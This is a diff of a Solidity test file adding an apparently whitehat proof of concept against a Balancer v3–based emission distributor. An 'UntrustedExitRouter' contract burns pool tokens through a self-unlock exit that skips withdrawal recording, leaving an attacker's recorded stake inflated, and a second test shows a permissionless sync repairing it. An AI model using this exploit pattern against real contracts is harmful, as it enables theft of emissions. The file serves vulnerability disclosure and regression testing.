@@ -3,6 +3,8 @@ pragma solidity ^0.8.26;
 
 import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
+import { IVault } from "@balancer-labs/v3-interfaces/contracts/vault/IVault.sol";
+import { RemoveLiquidityParams, RemoveLiquidityKind } from "@balancer-labs/v3-interfaces/contracts/vault/VaultTypes.sol";
 import { Router } from "@balancer-labs/v3-vault/contracts/Router.sol";
 import { IPermit2 } from "permit2/src/interfaces/IPermit2.sol";
 
@@ -158,5 +160,165 @@ contract RouterIntegrationTest is StagePIntegrationFixture {
         // Symmetric: userLP decrements by exactly the burned BPT and still tracks live BPT in lockstep.
         assertEq(IERC20(pilotPools[0]).balanceOf(lp), bptOut - exactBptIn);
         assertEq(distributor.userLP(pilotPools[0], lp), bptOut - exactBptIn);
+    }
+}
+
+/// @dev Untrusted proportional exit router — self-unlock remove with no getSender and no F-09 seat,
+///      so the hook skips recordWithdrawal on exit.
+contract UntrustedExitRouter {
+    IVault internal immutable vault;
+
+    constructor(IVault vault_) {
+        vault = vault_;
+    }
+
+    /// @notice Burns `bptAmount` BPT held by this contract via proportional remove-liquidity.
+    function exitPool(address pool, uint256 bptAmount) external {
+        bytes memory result = vault.unlock(abi.encodeCall(this.exitCallback, (pool, bptAmount)));
+        abi.decode(result, (uint256[]));
+    }
+
+    function exitCallback(address pool, uint256 bptAmount)
+        external
+        returns (uint256[] memory amountsOut)
+    {
+        require(msg.sender == address(vault), "onlyVault");
+        IERC20[] memory tokens = vault.getPoolTokens(pool);
+        uint256[] memory minAmountsOut = new uint256[](tokens.length);
+        (, amountsOut, ) = vault.removeLiquidity(
+            RemoveLiquidityParams({
+                pool: pool,
+                from: address(this),
+                maxBptAmountIn: bptAmount,
+                minAmountsOut: minAmountsOut,
+                kind: RemoveLiquidityKind.PROPORTIONAL,
+                userData: ""
+            })
+        );
+        for (uint256 i = 0; i < tokens.length; ++i) {
+            if (amountsOut[i] > 0) {
+                vault.sendTo(tokens[i], address(this), amountsOut[i]);
+            }
+        }
+    }
+}
+
+/// @title P1 B.3 — flash-inflation face (fork, Router chain)
+/// @notice Reproduction PoC for seam-1 root cause B.3's flash-inflation face. Negative to
+///         `test_PostSeat_RouterRemoveDecrementsRecorder`: an honest Router removal decrements the
+///         recorder and an untrusted self-unlock exit does not. The add size is arbitrary; the defect
+///         scales with whatever capital an attacker can flash. The seed-omission face lives in
+///         test/whitehat/P1_B3.t.sol and, unlike this one, no caller can heal it.
+contract RouterFlashDenominatorTest is StagePIntegrationFixture {
+    address internal constant MAINNET_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant CANONICAL_PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
+
+    address internal router;
+    EmissionDistributor internal distributor;
+    address internal gov;
+
+    function setUp() public override {
+        super.setUp();
+        distributor = orchestrator.emissionDistributor();
+        gov = address(orchestrator);
+        vm.setEnv("AUREUM_VAULT", vm.toString(address(vault)));
+        vm.setEnv("WETH_ADDRESS", vm.toString(MAINNET_WETH));
+        vm.setEnv("PERMIT2_ADDRESS", vm.toString(CANONICAL_PERMIT2));
+        router = new DeployRouter().run();
+    }
+
+    function _fundAndPermit(address lp, IERC20[] memory tokens, uint256[] memory amts) internal {
+        vm.startPrank(lp);
+        for (uint256 i = 0; i < tokens.length; ++i) {
+            deal(address(tokens[i]), lp, amts[i]);
+            tokens[i].approve(CANONICAL_PERMIT2, type(uint256).max);
+            IPermit2(CANONICAL_PERMIT2).approve(
+                address(tokens[i]), router, uint160(amts[i]), uint48(block.timestamp + 1 days)
+            );
+        }
+        vm.stopPrank();
+    }
+
+    function _seatRouter() internal {
+        vm.prank(gov);
+        hook.setGovernanceModule(gov);
+        vm.prank(gov);
+        hook.setTrustedRouter(router, true);
+    }
+
+    function _routerAdd(address lp) internal returns (uint256 bptOut) {
+        IERC20[] memory tokens = vault.getPoolTokens(pilotPools[0]);
+        uint256[] memory amts = new uint256[](tokens.length);
+        for (uint256 i = 0; i < amts.length; ++i) {
+            amts[i] = 100e18;
+        }
+        _fundAndPermit(lp, tokens, amts);
+        vm.prank(lp);
+        bptOut = Router(payable(router)).addLiquidityUnbalanced(pilotPools[0], amts, 1, false, "");
+    }
+
+    function test_P1_B3_untrustedExitBurnsBptWithoutDeflatingTheRecorderTally() public {
+        _seatRouter();
+        address pool = pilotPools[0];
+        address attacker = makeAddr("flashAttacker");
+
+        uint256 bptOut = _routerAdd(attacker);
+        uint256 poolTotalAfterAdd = distributor.poolTotalLP(pool);
+        assertGt(bptOut, 0, "seated Router add minted BPT");
+        assertEq(distributor.userLP(pool, attacker), bptOut, "recorder credited the full add");
+
+        uint256 supplyBeforeExit = IERC20(pool).totalSupply();
+        UntrustedExitRouter exitRouter = new UntrustedExitRouter(vault);
+        vm.prank(attacker);
+        IERC20(pool).transfer(address(exitRouter), bptOut);
+        exitRouter.exitPool(pool, bptOut);
+        uint256 supplyAfterExit = IERC20(pool).totalSupply();
+
+        assertEq(
+            supplyBeforeExit - supplyAfterExit,
+            bptOut,
+            "untrusted exit burned the transferred BPT from total supply"
+        );
+        assertEq(IERC20(pool).balanceOf(attacker), 0, "attacker holds no live BPT after exit");
+        assertEq(
+            distributor.poolTotalLP(pool),
+            poolTotalAfterAdd,
+            "recorder poolTotalLP unchanged after untrusted exit"
+        );
+        assertEq(
+            distributor.userLP(pool, attacker),
+            bptOut,
+            "recorder userLP still reports the full inflated add"
+        );
+    }
+
+    function test_P1_B3_permissionlessSyncPositionHealsTheFlashInflation() public {
+        _seatRouter();
+        address pool = pilotPools[0];
+        address attacker = makeAddr("flashAttacker");
+        address stranger = makeAddr("stranger");
+
+        uint256 bptOut = _routerAdd(attacker);
+        uint256 poolTotalAfterAdd = distributor.poolTotalLP(pool);
+
+        UntrustedExitRouter exitRouter = new UntrustedExitRouter(vault);
+        vm.prank(attacker);
+        IERC20(pool).transfer(address(exitRouter), bptOut);
+        exitRouter.exitPool(pool, bptOut);
+
+        uint256 stranded = bptOut;
+        vm.prank(stranger);
+        distributor.syncPosition(pool, attacker);
+
+        assertEq(
+            distributor.poolTotalLP(pool),
+            poolTotalAfterAdd - stranded,
+            "syncPosition heals flash inflation rather than leaving permanent corruption"
+        );
+        assertEq(
+            distributor.userLP(pool, attacker),
+            0,
+            "attacker recorded stake cleared after sync heals the flash window"
+        );
     }
 }
